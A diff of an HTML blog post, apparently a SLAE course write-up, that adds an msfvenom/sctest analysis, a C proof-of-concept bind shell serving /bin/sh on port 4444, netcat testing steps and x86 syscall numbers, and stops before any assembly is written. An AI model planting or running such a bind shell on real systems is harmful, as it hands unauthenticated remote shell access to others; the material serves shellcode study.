@@ -77,13 +77,21 @@
 												<br><h2>Drafting the Proof of Concept</h2>
 
 												<p>
-													&emsp; &emsp;It is important to visualize what a bind shell looks like in higher level objective C code before attempting to write it in x86 assembly. &nbsp;The tool, <i>libemu</i> has a component
+													&emsp; &emsp;It is important to visualize what a bind shell looks like in higher level objective C code before attempting to write it in x86 assembly. &nbsp;
+													<a href="https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238" target="_blank" style="color:blue;"><i>The Shellcoder's Handbook</i></a>
+													formalizes this process in 5 steps:<br><br>
+													&emsp; &emsp;1) &nbsp;Write desired shellcode in a high-level language.<br>
+													&emsp; &emsp;2) &nbsp;Compile and disassemble the high-level shellcode program.<br>
+													&emsp; &emsp;3) &nbsp;Analyze how the program works from an assembly level.<br>
+													&emsp; &emsp;4) &nbsp;Clean up the assembly to make it smaller and injectable.<br>
+													&emsp; &emsp;5) &nbsp;Extract opcodes and create shellcode.<br><br>
+													 &nbsp;The tool, <i>libemu</i> has a component
 													called <i>sctest</i> (shellcode test) that analyzes payloads to reveal useful information. &nbsp;Using it with <i>msfvenom</i> shows the main functions used in an unstaged bind shell payload.
 													 &nbsp;Below is the output of the command <code>msfvenom -p linux/x86/shell_bind_tcp R | ~/SLAE/Libemu/tools/sctest/sctest -vvv -Ss 100000</code>
 												</p>
 
 												<pre>
-													<code class="c-like" style=display:block;white-space:pre-wrap>
+													<code class="bash" style=display:block;white-space:pre-wrap>
 -- snip --
 
 int socket (
@@ -147,7 +155,7 @@ int execve (
 													From here you can see the functions <i>socket()</i>, <i>bind()</i>, <i>listen()</i>, <i>accept()</i>, <i>dup2()</i>, and <i>execve()</i> are primary drivers of the
 													payload. &nbsp;Conveniently it also displays parameters used along with their values. &nbsp;It takes some googling and reading Linux man-pages
 													(like <a href="https://man7.org/linux/man-pages/man2/bind.2.html" target="_blank" style="color:blue;">this one</a>) to
-													get a general idea of what libraries to include, where to find them, and what parameters does each function need. &nbsp;Below is the resultant PoC:
+													get a general idea of what libraries to include, where to find them, and what parameters each function needs. &nbsp;Below is the resultant PoC:
 												</p>
 
 
@@ -158,22 +166,95 @@ int execve (
 #include &lt;sys/types.h>
 #include &lt;sys/socket.h>
 #include &lt;unistd.h>
+
+int main(){
+
+  int fd, new_fd; // File descriptor to hold socket() output and accept() output respectively
+  fd = socket(AF_INET, SOCK_STREAM, 0);
+
+  // Define structures for home and remote machines
+  struct sockaddr_in home, remote;
+
+  // Set attributes in sockaddr_in home
+  home.sin_family = AF_INET;
+  home.sin_port = 4444;
+  home.sin_addr.s_addr = 0;
+  memset(&(home.sin_zero), '\0', 8);
+
+  // Bind socket to home address structure
+  bind(fd, (struct socketaddr *)&home, 16);
+
+  // Listen on socket for a max length of 4 pending connections
+  listen(fd, 4);
+
+  // Create new file descriptor with contents of accepted connection structure
+  new_fd = accept(fd, (struct sockaddr *)&remote, sizeof(struct sockaddr_in));
+
+  // Duplicate socket file descriptor to each standard I/O file descriptor: stdin,
+  // stdout, and stderr
+  dup2(new_fd, 2);
+  dup2(new_fd, 1);
+  dup2(new_fd, 0);
+
+  // Execute shell
+  execve("//bin/sh", (char*[]){"//bin/sh", NULL});
+
+}
 													</code>
 												</pre>
 
 												<p>
-													The above code looks very similar to what is found in server side socket code.
+													The above code looks very similar to what is found in server-side socket code. &nbsp;Rensselaer Polytechnic Institute (RPI) even provides a
+													<a href="https://www.cs.rpi.edu/~moorthy/Courses/os98/Pgms/socket.html" target="_blank" style="color:blue;">walkthrough</a> of what each line of code means in their <i>server.c</i> program.
+													 &nbsp; A quick explanation of each function is below:<br><br>
+													 <b><i>socket</i></b>: &nbsp;Creates a TCP communication endpoint using an IPv4 address and defines it as a file descriptor (fd)<br>
+													 <b><i>bind</i></b>: &nbsp;Assigns the file descriptor from <i>socket</i> to an address expressed as a structure. &nbsp;The address structure must be declared and have
+													 its attributes prior to its use in <i>bind</i>. &nbsp;Attribute information can be found <a href="https://www.tutorialspoint.com/unix_sockets/socket_structures.htm" target="_blank" style="color:blue;">here</a>.<br>
+													 <b><i>listen</i></b>: &nbsp;Marks the file descriptor from <i>socket</i> as passive and accepting of incoming connections.<br>
+													 <b><i>accept</i></b>: &nbsp;Creates a new file descriptor using the first connection request in the listening socket/file descriptor.<br>
+													 <b><i>dup2</i></b>: &nbsp;Duplicates the new file descriptor to the standard I/O file descriptors (stdin = 0, stdout = 1, stderr = 2). &nbsp;This allows normal text output to the new file descriptor for
+													  when the shell is executed.<br>
+													 <b><i>execve</i></b>: &nbsp;Execute <i>/bin/sh</i>. &nbsp;Make sure the string length is a multiple of 4 to cleanly push the instruction onto the stack. &nbsp;Command is <i>//bin/sh</i> in this case to make it
+													 <i>//bi</i> and <i>n/sh</i>.<br><br>
+
+													 This code can be tested by executing a quick compile and run. &nbsp;Open a new terminal window and run <i>netcat</i> against the pre-determined IP address and port number. &nbsp;The <i>-n</i> and
+													 <i>-v</i> switches respectively prevent DNS lookups and enable verbose output. &nbsp;On success, a "succeeded!" message should display followed by a <i>/bin/sh</i> interface. &nbsp;Confirm the connection
+													 with <i>netstat</i>.
 												</p>
-
-
-
+												<center><div class="image post"><img src="../images/slae/3-c-test.png" alt="" /></div></center><br>
 
 
 												<br><h2>Assembly Code Creation</h2>
 
 												<p>
-													Assembly code goes here.
+													&emsp; &emsp;Now that high-level functions are organized, the fun starts when disassembling the binary to inspect activity. &nbsp;Running the binary through <i>objdump</i>
+													shows the first function call in action. &nbsp;Each argument to <i>socket()</i> is pushed onto the stack before calling the function.
 												</p>
+												<center><div class="image post"><img src="../images/slae/4-socket-call.png" alt="" /></div></center><br>
+												<!--The first step is to find the system call table that lists each primary function. -->
+
+
+												<p>
+													Although similar, it is not quite intended for the shellcode. &nbsp;It provides a clue to how assembly code will be drafted. &nbsp;Using function like <i>socket</i> in shellcode
+													are better suited as system calls. &nbsp;To get system call information, the system call location must be known. &nbsp;This can happen with a neat command below, which shows
+													header files used in preprocessing.
+												</p>
+												<center><div class="image post"><img src="../images/slae/5-find-file.png" alt="" /></div></center><br>
+
+
+												<p>
+													Open <i>asm/unistd_32.h</i> to find the expected system call table. &nbsp;Scroll down to find <i>socketcall</i> set to 102, <i>bind</i> to 361, <i>listen</i> to 363, and <i>accept4</i> to 364. &nbsp;Also
+													<i>dup2</i> is 63 and <i>execve</i> is 11. &nbsp;Below is what the system call table looks like.
+												</p>
+												<center><div class="image post"><img src="../images/slae/6-syscalls.png" alt="" /></div></center><br>
+
+
+												<p>
+													The assembly can be created. &nbsp;Start with the jump-call-pop outline
+												</p>
+
+
+
 
 
 												<br><h2>Demonstration</h2>
